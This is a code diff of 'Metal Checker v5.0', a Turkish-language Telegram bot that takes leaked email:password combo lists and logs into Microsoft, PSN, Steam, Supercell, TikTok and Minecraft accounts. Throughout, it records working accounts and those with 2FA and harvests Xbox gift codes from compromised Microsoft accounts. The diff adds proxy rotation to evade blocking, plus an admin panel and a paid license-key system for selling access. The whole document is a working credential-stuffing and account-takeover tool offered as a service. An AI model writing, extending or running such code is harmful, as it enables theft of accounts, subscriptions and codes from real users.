+                    active_subs = [s for s in subs if not s.get('is_expired', True)]
                     if active_subs:
                         self.ms_premium += 1
                         for s in active_subs: self.latest_active_subs.append(s.get('name', 'Unknown Sub'))
-                    elif subs: self.ms_expired += 1
+                    elif subs:
+                        self.ms_expired += 1
                         
                     if res.get("psn_orders", 0) > 0: 
                         self.psn_hits += 1
@@ -1010,9 +952,6 @@ class LiveStats:
                     if res.get("supercell_games"): self.sc_hits += 1
                     if res.get("tiktok_username"): self.tk_hits += 1
                     if res.get("minecraft_username"): self.mc_hits += 1
-                    if res.get("roblox_status") == "LINKED":
-                        self.rbx_hits += 1
-                        self.latest_roblox.append(res.get("roblox_data", {}).get("username", "Unknown"))
             elif status == "2FA": self.two_fa += 1
             else: self.bads += 1
 
@@ -1031,8 +970,7 @@ class LiveStats:
             progress = (self.checked / self.total * 100) if self.total > 0 else 0
             
             if self.mode in ["code_fetch", "code_fetch_val"]:
-                text = f"⚙️ *METAL CODES - LIVE ENGINE* ⚙️\n"
-                text += f"━━━━━━━━━━━━━━━━━━━━\n"
+                text = f"⚙️ *METAL CODES - LIVE ENGINE* ⚙️\n━━━━━━━━━━━━━━━━━━━━\n"
                 text += f"📥 *Accounts Checked:* `{self.checked}/{self.total}`\n"
                 text += f"🟢 *Total Codes Fetched:* `{self.fetched_codes}`\n"
                 if self.mode == "code_fetch_val":
@@ -1045,10 +983,8 @@ class LiveStats:
                 text += f"🚀 *CPM:* `{int(cpm)}` | ⏱ *Elapsed:* `{int(elapsed)}s`\n"
                 return text
 
-            text = f"⚙️ *METAL CHECKER - LIVE RESULTS* ⚙️\n"
-            text += f"━━━━━━━━━━━━━━━━━━━━\n"
-            text += f"🟢 *Hits:* `{self.hits}` | 🟡 *2FA:* `{self.two_fa}` | 🔴 *Bad:* `{self.bads}`\n"
-            text += f"━━━━━━━━━━━━━━━━━━━━\n"
+            text = f"⚙️ *METAL CHECKER - LIVE RESULTS* ⚙️\n━━━━━━━━━━━━━━━━━━━━\n"
+            text += f"🟢 *Hits:* `{self.hits}` | 🟡 *2FA:* `{self.two_fa}` | 🔴 *Bad:* `{self.bads}`\n━━━━━━━━━━━━━━━━━━━━\n"
             
             if self.mode in ["microsoft", "both"]:
                 text += f"🎮 *Active Subs:* `{self.ms_premium}` | 💀 *Expired:* `{self.ms_expired}`\n"
@@ -1058,11 +994,10 @@ class LiveStats:
                 if self.mode in ["psn", "both"]: text += f"🎯 *PSN:* `{self.psn_hits}`\n"
                 if self.mode in ["steam", "both"]: text += f"🎲 *Steam:* `{self.steam_hits}`\n"
                 
-            if self.mode in ["supercell", "tiktok", "minecraft", "roblox", "both"]:
+            if self.mode in ["supercell", "tiktok", "minecraft", "both"]:
                 if self.mode in ["supercell", "both"]: text += f"⚔️ *Supercell:* `{self.sc_hits}`\n"
                 if self.mode in ["tiktok", "both"]: text += f"📱 *TikTok:* `{self.tk_hits}`\n"
                 if self.mode in ["minecraft", "both"]: text += f"⛏️ *Minecraft:* `{self.mc_hits}`\n"
-                if self.mode in ["roblox", "both"]: text += f"🟥 *Roblox:* `{self.rbx_hits}`\n"
                 
             text += f"━━━━━━━━━━━━━━━━━━━━\n"
             text += f"📊 *Progress:* `{self.checked}/{self.total} ({progress:.1f}%)`\n"
@@ -1070,14 +1005,13 @@ class LiveStats:
             return text
 
 # -----------------------------------------
-# 3. BACKGROUND PROCESS RUNNERS FOR CODES
+# BACKGROUND PROCESS RUNNERS FOR CODES
 # -----------------------------------------
 def run_code_operations(chat_id, accounts, config):
     try:
         total_accounts = len(accounts)
         result_mgr = ResultManager(chat_id, config["mode"])
         stats = LiveStats(total_accounts, chat_id, config["mode"])
-        
         msg = bot.send_message(chat_id, stats.generate_text(), parse_mode="Markdown")
         stats.message_id = msg.message_id
         
@@ -1090,15 +1024,14 @@ def run_code_operations(chat_id, accounts, config):
 
         updater_thread = Thread(target=ui_updater)
         updater_thread.start()
-
         tools = XboxCodeTools()
         fetched_codes_list = []
         
-        # 1. FETCH ASAMASI
         def fetch_worker(acc):
             if stop_flags.get(chat_id, False): return
             email, password = acc
             session = requests.Session()
+            ProxyManager.get_random_proxy(session)
             session.headers.update({'User-Agent': 'Mozilla/5.0'})
             try:
                 url_post, ppft = tools.fetch_oauth_tokens(session)
@@ -1115,7 +1048,7 @@ def run_code_operations(chat_id, accounts, config):
                                     result_mgr.save_code_result(c, "fetched")
             except: pass
             finally:
-                stats.update("CHECKED") # Sayac artsın diye dummy stat
+                stats.update("CHECKED")
                 session.close()
 
         with ThreadPoolExecutor(max_workers=config["threads"]) as executor:
@@ -1123,12 +1056,9 @@ def run_code_operations(chat_id, accounts, config):
                 if stop_flags.get(chat_id, False): break
                 executor.submit(fetch_worker, account)
 
-        # 2. VALIDATE ASAMASI (EGER ISTENDIYSE)
         if config["mode"] == "code_fetch_val" and fetched_codes_list and not stop_flags.get(chat_id, False):
-            stats.checked = 0 # Sifirla ki validator tablosu baslasin
+            stats.checked = 0 
             stats.total = len(fetched_codes_list)
-            
-            # Kodları checklemek için tek bir valid hesap yakala (örneğin listedeki ilk çalışan hesap)
             val_session = None
             for e, p in accounts:
                 val_session = tools.login_microsoft_account(e, p)
@@ -1156,45 +1086,37 @@ def run_code_operations(chat_id, accounts, config):
                     for code in fetched_codes_list:
                         if stop_flags.get(chat_id, False): break
                         executor.submit(validate_worker, code)
-                
                 val_session.close()
             else:
                 bot.send_message(chat_id, "⚠️ Validator için çalışan aktif bir MS hesabı bulunamadı. Sadece fetch edildi.")
 
         active_tasks[chat_id] = False
         updater_thread.join()
-
         try: bot.edit_message_text(stats.generate_text() + "\n\n✅ *İŞLEM TAMAMLANDI!*", chat_id, stats.message_id, parse_mode="Markdown")
         except: pass
 
         bot.send_message(chat_id, "📦 Metal Codes paketi hazırlanıyor...")
         files_to_send, is_zip = result_mgr.get_delivery_files()
-        
-        if files_to_send:
-            for f_path in files_to_send:
-                with open(f_path, 'rb') as f:
-                    bot.send_document(chat_id, f, caption=f"🔥 *METAL CODES - {os.path.basename(f_path)}*", parse_mode="Markdown")
-                try: os.remove(f_path)
-                except: pass
-        else:
-            bot.send_message(chat_id, "ℹ️ Gönderilecek dosya bulunamadı veya işlem sırasında kod çekilemedi.")
+        if is_zip and files_to_send:
+            with open(files_to_send[0], 'rb') as f:
+                bot.send_document(chat_id, f, caption="🔥 *METAL CODES - FULL PACKAGE (.ZIP)*", parse_mode="Markdown")
         
         try: shutil.rmtree(result_mgr.base_folder)
         except: pass
-            
+        if is_zip and files_to_send:
+            try: os.remove(files_to_send[0])
+            except: pass
         user_states[chat_id] = "IDLE"
         
     except Exception as e:
-        bot.send_message(chat_id, f"❌ Ciddi bir hata oluştu: {str(e)}")
+        bot.send_message(chat_id, f"❌ Hata: {str(e)}")
         active_tasks[chat_id] = False
         user_states[chat_id] = "IDLE"
 
 def run_code_sorter(chat_id, content):
     try:
         lines = [l.strip() for l in content.split('\n') if l.strip()]
-        if not lines:
-            bot.send_message(chat_id, "❌ Dosya boş.")
-            return
+        if not lines: return bot.send_message(chat_id, "❌ Dosya boş.")
             
         tools = XboxCodeTools()
         game_groups = {}
@@ -1211,21 +1133,76 @@ def run_code_sorter(chat_id, content):
                 game_groups['Other'].append((code_line.strip(), 'Unknown'))
                 
         formatted_output = tools.format_game_codes_output(game_groups)
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"sorted_codes_{timestamp}.txt"
         
-        filename = "sorted_codes.txt"
-        
-        with open(filename, 'w', encoding='utf-8') as f:
-            f.write(formatted_output)
-            
-        with open(filename, 'rb') as f:
-            bot.send_document(chat_id, f, caption="✅ *Kodlar Başarıyla Sortlandı!*", parse_mode="Markdown")
-            
+        with open(filename, 'w', encoding='utf-8') as f: f.write(formatted_output)
+        with open(filename, 'rb') as f: bot.send_document(chat_id, f, caption="✅ *Kodlar Başarıyla Sortlandı!*", parse_mode="Markdown")
         os.remove(filename)
         user_states[chat_id] = "IDLE"
-        
     except Exception as e:
-        bot.send_message(chat_id, f"❌ Sort işlemi başarısız: {str(e)}")
+        bot.send_message(chat_id, f"❌ Sort hatası: {str(e)}")
         user_states[chat_id] = "IDLE"
+
+# -----------------------------------------
+# TELEGRAM ADMIN PANEL HANDLERS
+# -----------------------------------------
+@bot.message_handler(commands=['admin'])
+def admin_panel(message):
+    chat_id = message.chat.id
+    if str(chat_id) != str(CHAT_ID) and str(chat_id) not in load_db().get("admins", []):
+        return bot.send_message(chat_id, "❌ Bu komutu kullanmaya yetkin yok.")
+    
+    markup = InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        InlineKeyboardButton("🔑 Key Üret", callback_data="admin_gen_key"),
+        InlineKeyboardButton("📢 Kanallar", callback_data="admin_channels"),
+        InlineKeyboardButton("👤 Adminler", callback_data="admin_admins"),
+        InlineKeyboardButton("📣 Broadcast", callback_data="admin_broadcast"),
+        InlineKeyboardButton("🌐 Proxy Ekle", callback_data="admin_proxy_add"),
+        InlineKeyboardButton("🔍 Proxy Check", callback_data="admin_proxy_check"),
+        InlineKeyboardButton("🗑 Havuzu Temizle", callback_data="admin_proxy_clear")
+    )
+    
+    db = load_db()
+    proxy_count = len(db.get("proxies", []))
+    status_text = f"👑 *METAL ADMIN PANEL*\n━━━━━━━━━━━━━━━━━━━━\n"
+    status_text += f"📊 Toplam Kullanıcı: `{len(db.get('users', {}))}`\n"
+    status_text += f"🌐 Proxy Havuzu: `{proxy_count}`\n"
+    if proxy_count > 0: status_text += "🟢 *Proxy Sistemi AKTİF (Kullanıcılar Zorunlu)*\n"
+    else: status_text += "🔴 *Proxy Sistemi KAPALI (Proxyless)*\n"
+    
+    bot.send_message(chat_id, status_text, parse_mode="Markdown", reply_markup=markup)
+
+@bot.message_handler(commands=['redeem'])
+def redeem_key(message):
+    chat_id = str(message.chat.id)
+    try:
+        key = message.text.split(" ")[1]
+        db = load_db()
+        keys = db.get("keys", {})
+        if key in keys:
+            days = keys[key]
+            users = db.get("users", {})
+            current_expiry = users.get(chat_id)
+            if current_expiry:
+                base_date = datetime.fromisoformat(current_expiry)
+                if base_date < datetime.now(): base_date = datetime.now()
+            else:
+                base_date = datetime.now()
+                
+            new_expiry = base_date + timedelta(days=days)
+            users[chat_id] = new_expiry.isoformat()
+            
+            del keys[key]
+            db["users"] = users
+            db["keys"] = keys
+            save_db(db)
+            bot.send_message(message.chat.id, f"✅ Key başarıyla kullanıldı. Bitiş: {new_expiry.strftime('%Y-%m-%d %H:%M')}")
+        else:
+            bot.send_message(message.chat.id, "❌ Geçersiz veya kullanılmış key.")
+    except:
+        bot.send_message(message.chat.id, "Kullanım: /redeem <key>")
 
 # -----------------------------------------
 # TELEGRAM BOT HANDLERS & MENUS
@@ -1233,6 +1210,13 @@ def run_code_sorter(chat_id, content):
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     chat_id = message.chat.id
+    
+    if not check_auth(chat_id):
+        return bot.send_message(chat_id, "❌ Bota erişiminiz yok. Bir lisans anahtarı satın alın ve `/redeem <key>` komutu ile aktif edin.", parse_mode="Markdown")
+        
+    if not check_force_sub(chat_id):
+        return bot.send_message(chat_id, "❌ Botu kullanabilmek için zorunlu kanallara katılmalısınız.")
+    
     user_states[chat_id] = "IDLE"
     user_configs[chat_id] = {"mode": "both", "api": 2, "threads": 10}
     
@@ -1242,7 +1226,7 @@ def send_welcome(message):
     
     bot.send_message(
         chat_id, 
-        "🤘 *Metal Drops & Icardi Sunar: METAL CHECKER v4.0*\n\nSınır yok, HWID yok. Hem hesap checker hem kod fetcher aktif. Seçimini yap.",
+        "🤘 *Metal Drops & Icardi Sunar: METAL CHECKER v5.0*\n\nSınır yok, HWID yok. Hem hesap checker hem kod fetcher aktif. Seçimini yap.",
         parse_mode="Markdown", reply_markup=markup
     )
 
@@ -1260,8 +1244,89 @@ def callback_handler(call):
     chat_id = call.message.chat.id
     data = call.data
     
-    # --- MENUS ---
-    if data == "menu_services":
+    # ---------------- ADMIN CALLBACKS ----------------
+    if data == "admin_gen_key":
+        markup = InlineKeyboardMarkup(row_width=3)
+        markup.add(
+            InlineKeyboardButton("1 Gün", callback_data="keygen_1"),
+            InlineKeyboardButton("3 Gün", callback_data="keygen_3"),
+            InlineKeyboardButton("1 Hafta", callback_data="keygen_7"),
+            InlineKeyboardButton("1 Ay", callback_data="keygen_30"),
+            InlineKeyboardButton("3 Ay", callback_data="keygen_90"),
+            InlineKeyboardButton("Lifetime", callback_data="keygen_3650"),
+            InlineKeyboardButton("Custom", callback_data="keygen_custom")
+        )
+        bot.edit_message_text("🔑 *KEY SÜRESİ SEÇİN*", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
+        
+    elif data.startswith("keygen_"):
+        val = data.split("_")[1]
+        if val == "custom":
+            user_states[chat_id] = "WAITING_FOR_CUSTOM_DAYS"
+            bot.edit_message_text("✍️ Lütfen gün sayısını yazın:", chat_id, call.message.message_id)
+        else:
+            days = int(val)
+            key = f"METAL-{''.join(random.choices(string.ascii_uppercase + string.digits, k=16))}"
+            db = load_db()
+            db["keys"][key] = days
+            save_db(db)
+            bot.edit_message_text(f"✅ Key Oluşturuldu ({days} Gün):\n`{key}`", chat_id, call.message.message_id, parse_mode="Markdown")
+
+    elif data == "admin_channels":
+        user_states[chat_id] = "WAITING_FOR_CHANNEL"
+        db = load_db()
+        chs = "\n".join(db.get("channels", []))
+        bot.edit_message_text(f"📢 *Zorunlu Kanallar:*\n{chs}\n\nYeni kanal eklemek/çıkarmak için kanalın IDsini (veya @username) yazın:", chat_id, call.message.message_id, parse_mode="Markdown")
+
+    elif data == "admin_admins":
+        if str(chat_id) != str(CHAT_ID):
+            return bot.answer_callback_query(call.id, "Sadece Kurucu işlem yapabilir!")
+        user_states[chat_id] = "WAITING_FOR_ADMIN"
+        db = load_db()
+        ads = "\n".join(db.get("admins", []))
+        bot.edit_message_text(f"👤 *Mevcut Adminler:*\n{ads}\n\nEkle/Çıkar için Chat ID yazın:", chat_id, call.message.message_id, parse_mode="Markdown")
+        
+    elif data == "admin_broadcast":
+        user_states[chat_id] = "WAITING_FOR_BROADCAST"
+        bot.edit_message_text("📣 *Yayınlanacak mesajı yazın:*", chat_id, call.message.message_id, parse_mode="Markdown")
+
+    elif data == "admin_proxy_add":
+        markup = InlineKeyboardMarkup(row_width=3)
+        markup.add(
+            InlineKeyboardButton("Socks4", callback_data="proxyadd_socks4"),
+            InlineKeyboardButton("Socks5", callback_data="proxyadd_socks5"),
+            InlineKeyboardButton("Http", callback_data="proxyadd_http")
+        )
+        bot.edit_message_text("🌐 *Eklenecek Proxy Türünü Seçin:*", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
+
+    elif data.startswith("proxyadd_"):
+        ptype = data.split("_")[1]
+        user_states[chat_id] = f"WAITING_FOR_PROXY_FILE_{ptype}"
+        bot.edit_message_text(f"📂 *{ptype.upper()} Proxylerini İçeren .txt Dosyasını Gönderin*", chat_id, call.message.message_id, parse_mode="Markdown")
+
+    elif data == "admin_proxy_clear":
+        db = load_db()
+        db["proxies"] = []
+        save_db(db)
+        bot.answer_callback_query(call.id, "Havuz temizlendi!")
+        
+    elif data == "admin_proxy_check":
+        markup = InlineKeyboardMarkup(row_width=3)
+        markup.add(
+            InlineKeyboardButton("Socks4", callback_data="proxychk_socks4"),
+            InlineKeyboardButton("Socks5", callback_data="proxychk_socks5"),
+            InlineKeyboardButton("Http", callback_data="proxychk_http")
+        )
+        bot.edit_message_text("🔍 *Check edilecek Proxy türünü seçin:*", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
+
+    elif data.startswith("proxychk_"):
+        ptype = data.split("_")[1]
+        user_states[chat_id] = f"WAITING_FOR_CHKPROXY_FILE_{ptype}"
+        bot.edit_message_text(f"📂 *{ptype.upper()} Check İçin .txt Gönderin*", chat_id, call.message.message_id, parse_mode="Markdown")
+
+
+    # ---------------- NORMAL MENUS ----------------
+    elif data == "menu_services":
+        if not check_force_sub(chat_id): return
         markup = InlineKeyboardMarkup(row_width=2)
         markup.add(
             InlineKeyboardButton("1. Microsoft Subs", callback_data="srv_microsoft"),
@@ -1270,21 +1335,20 @@ def callback_handler(call):
             InlineKeyboardButton("4. Supercell", callback_data="srv_supercell"),
             InlineKeyboardButton("5. TikTok", callback_data="srv_tiktok"),
             InlineKeyboardButton("6. Minecraft", callback_data="srv_minecraft"),
-            InlineKeyboardButton("7. Full Scan (.ZIP)", callback_data="srv_both"),
-            InlineKeyboardButton("8. Roblox", callback_data="srv_roblox")
+            InlineKeyboardButton("7. Full Scan (.ZIP)", callback_data="srv_both")
         )
         bot.edit_message_text("🎯 *SERVICE SELECTION*\nHangi servisleri vurmak istersin?", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
         
     elif data == "menu_codes":
+        if not check_force_sub(chat_id): return
         markup = InlineKeyboardMarkup(row_width=1)
         markup.add(
             InlineKeyboardButton("1. Fetch Codes", callback_data="code_fetch"),
             InlineKeyboardButton("2. Fetch & Validate Codes", callback_data="code_fetch_val"),
             InlineKeyboardButton("3. Sort Codes", callback_data="code_sort")
         )
-        bot.edit_message_text("🎁 *METAL CODES ENGINE*\nSınırsız ve HWID'siz Kod Çekici. Seçimini yap:", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
+        bot.edit_message_text("🎁 *METAL CODES ENGINE*\nSeçimini yap:", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
 
-    # --- CODE HANDLERS ---
     elif data in ["code_fetch", "code_fetch_val"]:
         user_configs[chat_id]["mode"] = data
         markup = InlineKeyboardMarkup(row_width=3)
@@ -1299,9 +1363,8 @@ def callback_handler(call):
     elif data == "code_sort":
         user_configs[chat_id]["mode"] = data
         user_states[chat_id] = "WAITING_FOR_SORT_FILE"
-        bot.edit_message_text("📂 *KODLARI SIRALA*\nİçinde daha önceden çektiğin kodların bulunduğu (.txt) formatındaki dosyayı gönder.", chat_id, call.message.message_id, parse_mode="Markdown")
+        bot.edit_message_text("📂 *KODLARI SIRALA*\n(.txt) formatındaki kod dosyasını gönder.", chat_id, call.message.message_id, parse_mode="Markdown")
 
-    # --- REGULAR SERVICES HANDLERS ---
     elif data.startswith("srv_"):
         mode = data.split("_")[1]
         user_configs[chat_id]["mode"] = mode
@@ -1337,17 +1400,64 @@ def callback_handler(call):
             f"✅ *SİSTEM HAZIR!*\n\n"
             f"Mod: `{mode_text}`\n"
             f"Threads: `{threads}`\n\n"
-            f"🔥 *Şimdi dosyayı (.txt) veya listeyi gönder.* Geldiği an işlemler otomatik başlayacak. Durdurmak için `/stop` yaz.",
+            f"🔥 *Şimdi dosyayı (.txt) veya listeyi gönder.*",
             chat_id, call.message.message_id, parse_mode="Markdown"
         )
 
+
 @bot.message_handler(content_types=['document', 'text'])
-def handle_combo(message):
+def handle_input(message):
     chat_id = message.chat.id
     state = user_states.get(chat_id)
     
-    if state not in ["WAITING_FOR_COMBO", "WAITING_FOR_SORT_FILE"]: return
-        
+    # Text states for admin
+    if state == "WAITING_FOR_CUSTOM_DAYS" and message.content_type == 'text':
+        try:
+            days = int(message.text)
+            key = f"METAL-{''.join(random.choices(string.ascii_uppercase + string.digits, k=16))}"
+            db = load_db()
+            db["keys"][key] = days
+            save_db(db)
+            bot.send_message(chat_id, f"✅ Key Oluşturuldu ({days} Gün):\n`{key}`", parse_mode="Markdown")
+        except: bot.send_message(chat_id, "Sayı girmeliydin.")
+        user_states[chat_id] = "IDLE"
+        return
+
+    if state == "WAITING_FOR_CHANNEL" and message.content_type == 'text':
+        ch = message.text.strip()
+        db = load_db()
+        if ch in db["channels"]: db["channels"].remove(ch)
+        else: db["channels"].append(ch)
+        save_db(db)
+        bot.send_message(chat_id, "✅ Kanallar güncellendi.")
+        user_states[chat_id] = "IDLE"
+        return
+
+    if state == "WAITING_FOR_ADMIN" and message.content_type == 'text':
+        adm = message.text.strip()
+        db = load_db()
+        if adm in db["admins"]: db["admins"].remove(adm)
+        else: db["admins"].append(adm)
+        save_db(db)
+        bot.send_message(chat_id, "✅ Adminler güncellendi.")
+        user_states[chat_id] = "IDLE"
+        return
+
+    if state == "WAITING_FOR_BROADCAST" and message.content_type == 'text':
+        text = message.text
+        db = load_db()
+        users = db.get("users", {})
+        count = 0
+        for uid in users:
+            try:
+                bot.send_message(uid, f"📢 *DUYURU*\n\n{text}", parse_mode="Markdown")
+                count += 1
+            except: pass
+        bot.send_message(chat_id, f"✅ Mesaj {count} kişiye iletildi.")
+        user_states[chat_id] = "IDLE"
+        return
+
+    # Files logic
     content = ""
     if message.content_type == 'document':
         file_info = bot.get_file(message.document.file_id)
@@ -1359,104 +1469,128 @@ def handle_combo(message):
     elif message.content_type == 'text':
         content = message.text
 
+    if state and state.startswith("WAITING_FOR_PROXY_FILE_"):
+        ptype = state.split("_")[-1]
+        lines = [l.strip() for l in content.split('\n') if l.strip()]
+        formatted = ProxyManager.format_proxies(lines, ptype)
+        db = load_db()
+        db["proxies"].extend(formatted)
+        save_db(db)
+        bot.send_message(chat_id, f"✅ {len(formatted)} adet {ptype.upper()} proxy havuza eklendi.")
+        user_states[chat_id] = "IDLE"
+        return
+
+    if state and state.startswith("WAITING_FOR_CHKPROXY_FILE_"):
+        ptype = state.split("_")[-1]
+        lines = [l.strip() for l in content.split('\n') if l.strip()]
+        formatted = ProxyManager.format_proxies(lines, ptype)
+        
+        bot.send_message(chat_id, f"🔍 {len(formatted)} adet proxy kontrol ediliyor...")
+        valid = []
+        def chk(p):
+            if ProxyManager.check_proxy(p): valid.append(p)
+            
+        with ThreadPoolExecutor(max_workers=50) as ex:
+            ex.map(chk, formatted)
+            
+        if valid:
+            res_txt = "\n".join(valid)
+            with open("live_proxies.txt", "w") as f: f.write(res_txt)
+            with open("live_proxies.txt", "rb") as f: bot.send_document(chat_id, f, caption=f"✅ {len(valid)} Live Proxy")
+            os.remove("live_proxies.txt")
+        else:
+            bot.send_message(chat_id, "Hepsi ölü.")
+        user_states[chat_id] = "IDLE"
+        return
+
     if state == "WAITING_FOR_SORT_FILE":
         run_code_sorter(chat_id, content)
         return
 
-    # Normal Combo İşlemleri
-    lines = [l.strip() for l in content.split('\n') if l.strip() and ':' in l]
-    if not lines:
-        bot.send_message(chat_id, "❌ Combolar bulunamadı. 'email:pass' formatında bir şeyler at.")
-        return
-        
-    user_states[chat_id] = "CHECKING"
-    stop_flags[chat_id] = False
-    active_tasks[chat_id] = True
-    config = user_configs[chat_id]
-    
-    # Eğer yeni METAL CODES sistemiyse oraya yönlendir, değilse klasik CHECKER sistemini başlat.
-    if config["mode"] in ["code_fetch", "code_fetch_val"]:
-        accounts = []
-        for line in lines:
-            parts = line.split(':', 1)
-            if len(parts) == 2: accounts.append((parts[0].strip(), parts[1].strip()))
-        
-        Thread(target=run_code_operations, args=(chat_id, accounts, config)).start()
-        return
-
-    # Klasik Checker
-    result_mgr = ResultManager(chat_id, config["mode"])
-    stats = LiveStats(len(lines), chat_id, config["mode"])
-    
-    msg = bot.send_message(chat_id, stats.generate_text(), parse_mode="Markdown")
-    stats.message_id = msg.message_id
-    
-    def process_line(line):
-        if stop_flags.get(chat_id, False): return
-        try:
-            parts = line.split(':', 1)
-            if len(parts) != 2: 
-                stats.update("BAD")
-                return
-            checker = UnifiedChecker(api_mode=config["api"], check_mode=config["mode"])
-            res = checker.check(parts[0].strip(), parts[1].strip())
-            stats.update(res["status"], res if res["status"] == "HIT" else None)
+    if state == "WAITING_FOR_COMBO":
+        if not check_auth(chat_id): return
+        lines = [l.strip() for l in content.split('\n') if l.strip() and ':' in l]
+        if not lines:
+            bot.send_message(chat_id, "❌ Combolar bulunamadı.")
+            return
             
-            if res["status"] == "HIT": result_mgr.save_hit(res)
-            elif res["status"] == "2FA": result_mgr.save_2fa(parts[0].strip(), parts[1].strip())
-        except: stats.update("ERROR")
-
-    def ui_updater():
-        while active_tasks.get(chat_id, False):
-            time.sleep(2.0)
-            if not active_tasks.get(chat_id, False): break 
-            try: bot.edit_message_text(stats.generate_text(), chat_id, stats.message_id, parse_mode="Markdown")
-            except: pass
-
-    updater_thread = Thread(target=ui_updater)
-    updater_thread.start()
-
-    with ThreadPoolExecutor(max_workers=config["threads"]) as executor:
-        for line in lines:
-            if stop_flags.get(chat_id, False): break
-            executor.submit(process_line, line)
-            
-    active_tasks[chat_id] = False
-    updater_thread.join()
-    
-    try: bot.edit_message_text(stats.generate_text() + "\n\n✅ *TARAMA BİTTİ VEYA DURDURULDU!*", chat_id, stats.message_id, parse_mode="Markdown")
-    except: pass
-    
-    bot.send_message(chat_id, "📦 Sonuçlar paketleniyor (Ayarlarına göre TXT veya ZIP)...")
-    
-    files_to_send, is_zip = result_mgr.get_delivery_files()
-    if is_zip and files_to_send:
-        with open(files_to_send[0], 'rb') as f:
-            bot.send_document(chat_id, f, caption="🔥 *METAL CHECKER - FULL SCAN (.ZIP)*", parse_mode="Markdown")
-    elif files_to_send:
-        for f_path in files_to_send:
-            with open(f_path, 'rb') as f:
-                name_clean = os.path.basename(f_path).replace('_', '\\_')
-                bot.send_document(chat_id, f, caption=f"🔥 *METAL CHECKER - {name_clean}*", parse_mode="Markdown")
-    else:
-        bot.send_message(chat_id, "ℹ️ Hiç hit çıkmadı veya kaydedilecek bir dosya oluşmadı.")
+        user_states[chat_id] = "CHECKING"
+        stop_flags[chat_id] = False
+        active_tasks[chat_id] = True
+        config = user_configs[chat_id]
         
-    try: shutil.rmtree(result_mgr.base_folder)
-    except: pass
-    if is_zip and files_to_send:
-        try: os.remove(files_to_send[0])
+        if config["mode"] in ["code_fetch", "code_fetch_val"]:
+            accounts = []
+            for line in lines:
+                parts = line.split(':', 1)
+                if len(parts) == 2: accounts.append((parts[0].strip(), parts[1].strip()))
+            Thread(target=run_code_operations, args=(chat_id, accounts, config)).start()
+            return
+
+        result_mgr = ResultManager(chat_id, config["mode"])
+        stats = LiveStats(len(lines), chat_id, config["mode"])
+        msg = bot.send_message(chat_id, stats.generate_text(), parse_mode="Markdown")
+        stats.message_id = msg.message_id
+        
+        def process_line(line):
+            if stop_flags.get(chat_id, False): return
+            try:
+                parts = line.split(':', 1)
+                if len(parts) != 2: 
+                    stats.update("BAD")
+                    return
+                checker = UnifiedChecker(api_mode=config["api"], check_mode=config["mode"])
+                res = checker.check(parts[0].strip(), parts[1].strip())
+                stats.update(res["status"], res if res["status"] == "HIT" else None)
+                
+                if res["status"] == "HIT": result_mgr.save_hit(res)
+                elif res["status"] == "2FA": result_mgr.save_2fa(parts[0].strip(), parts[1].strip())
+            except: stats.update("ERROR")
+
+        def ui_updater():
+            while active_tasks.get(chat_id, False):
+                time.sleep(2.0)
+                if not active_tasks.get(chat_id, False): break 
+                try: bot.edit_message_text(stats.generate_text(), chat_id, stats.message_id, parse_mode="Markdown")
+                except: pass
+
+        updater_thread = Thread(target=ui_updater)
+        updater_thread.start()
+
+        with ThreadPoolExecutor(max_workers=config["threads"]) as executor:
+            for line in lines:
+                if stop_flags.get(chat_id, False): break
+                executor.submit(process_line, line)
+                
+        active_tasks[chat_id] = False
+        updater_thread.join()
+        
+        try: bot.edit_message_text(stats.generate_text() + "\n\n✅ *TARAMA BİTTİ!*", chat_id, stats.message_id, parse_mode="Markdown")
         except: pass
-    
-    user_states[chat_id] = "IDLE"
+        
+        bot.send_message(chat_id, "📦 Sonuçlar paketleniyor...")
+        files_to_send, is_zip = result_mgr.get_delivery_files()
+        if is_zip and files_to_send:
+            with open(files_to_send[0], 'rb') as f:
+                bot.send_document(chat_id, f, caption="🔥 *METAL CHECKER - FULL SCAN (.ZIP)*", parse_mode="Markdown")
+        elif files_to_send:
+            for f_path in files_to_send:
+                with open(f_path, 'rb') as f:
+                    name_clean = os.path.basename(f_path).replace('_', '\\_')
+                    bot.send_document(chat_id, f, caption=f"🔥 *METAL CHECKER - {name_clean}*", parse_mode="Markdown")
+        else:
+            bot.send_message(chat_id, "ℹ️ Hiç hit çıkmadı.")
+            
+        try: shutil.rmtree(result_mgr.base_folder)
+        except: pass
+        if is_zip and files_to_send:
+            try: os.remove(files_to_send[0])
+            except: pass
+        user_states[chat_id] = "IDLE"
 
 if __name__ == "__main__":
-    print("[DEBUG] Eski oturumlar ve çakışmalar zorla temizleniyor...")
-    try:
-        bot.remove_webhook()
-        time.sleep(1)
-    except Exception as e:
-        print(f"[DEBUG] Webhook temizleme atlandı: {e}")
-        pass
-        
-    print("[DEBUG] Metal Checker v4.0 (Fetcher Edition) Bot Başlatılıyor...")
+    try: bot.remove_webhook(); time.sleep(1)
+    except: pass
+    print(f"[DEBUG] Metal Checker v5.0 (Admin Edition) Başlatılıyor... Owner ID: {CHAT_ID}")
     bot.infinity_polling(skip_pending=True, timeout=60, long_polling_timeout=60)
+
